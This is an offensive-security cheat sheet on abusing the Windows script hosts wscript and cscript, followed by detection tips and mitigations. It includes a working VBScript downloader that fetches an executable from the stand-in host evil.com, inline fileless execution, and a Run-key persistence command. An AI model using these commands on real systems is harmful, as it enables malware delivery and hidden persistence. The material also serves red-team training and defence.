# 🧾 Wscript / Cscript - Living Off the Land

**wscript.exe** and **cscript.exe** are native Windows script hosts used to execute `.vbs` (VBScript) and `.js` (JScript) files. While designed for automation, attackers abuse them for **fileless malware**, **stealthy execution**, and **script-based persistence**.

> ⚠️ These are classic LoLBins used by malware like Emotet, AgentTesla, and APT loaders. Use only in labs or red team ranges.

---

## 🛠️ What They Do
- Execute `.vbs` or `.js` scripts
- Run silently in background (wscript) or with console output (cscript)
- Can launch system commands, download payloads, or establish persistence

---

## 💣 Common LotL Wscript/Cscript Techniques

### 1. Execute VBScript File Silently
```cmd
wscript C:\Users\Public\payload.vbs
```
✅ Launches script in background with no prompt or terminal window

---

### 2. Run Malicious JavaScript with Console Output
```cmd
cscript C:\Users\Public\payload.js
```
✅ Useful for debugging or noisy malware

---

### 3. Inline VBS for Fileless Execution
```cmd
wscript.exe //e:vbscript "CreateObject("Wscript.Shell").Run("calc.exe")"
```
✅ Executes VBScript from command-line — stealth without a file

---

### 4. VBScript Downloader
```vbscript
Set x = CreateObject("Microsoft.XMLHTTP")
x.Open "GET", "http://evil.com/beacon.exe", False
x.Send
Set s = CreateObject("ADODB.Stream")
s.Type = 1: s.Open: s.Write x.responseBody
s.SaveToFile "C:\Users\Public\drop.exe", 2
```
✅ Can be executed via `wscript downloader.vbs` — downloads + saves payload

---

### 5. Persistence via Run Key with VBScript
```cmd
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "wscript.exe C:\Users\Public\stealth.vbs" /f
```
✅ Script runs at logon invisibly — perfect for persistence

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| `wscript` or `cscript` launching unknown scripts | Monitor command-line for unusual script paths |
| Scripts from `Public`, `%TEMP%`, `AppData` | Flag as suspicious unless whitelisted |
| Use of `CreateObject()` | Detect common stagers like `XMLHTTP`, `ADODB.Stream`, `Wscript.Shell`

---

## 🔐 Mitigation Strategies
- Block execution of `wscript.exe` and `cscript.exe` via AppLocker or WDAC
- Monitor usage of script hosts in user sessions
- Inspect `.vbs` and `.js` files dropped or accessed by unknown processes
- Alert on known script-based stagers and downloaders

---

> 🧠 These script hosts are old school but still effective. Used in phishing, droppers, macro payloads, and malware delivery chains. Pair with certutil, mshta, or regsvr32 for flexible multi-stage attacks.
